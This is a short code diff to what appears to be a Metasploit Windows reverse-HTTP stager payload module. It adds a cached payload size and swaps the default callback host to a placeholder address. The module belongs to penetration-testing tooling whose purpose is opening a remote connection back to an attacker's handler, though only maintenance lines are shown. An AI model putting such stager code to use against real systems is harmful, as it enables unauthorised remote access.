@@ -10,6 +10,8 @@ require 'msf/core/handler/reverse_http'
 
 module Metasploit3
 
+  CachedSize = 322
+
   include Msf::Payload::Stager
   include Msf::Payload::Windows
 
@@ -72,7 +74,7 @@ module Metasploit3
     u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW) + "\x00"
     p[i, u.length] = u
 
-    lhost = datastore['LHOST'] || Rex::Socket.source_address
+    lhost = datastore['LHOST'] || '127.127.127.127'
     if Rex::Socket.is_ipv6?(lhost)
       lhost = "[#{lhost}]"
     end
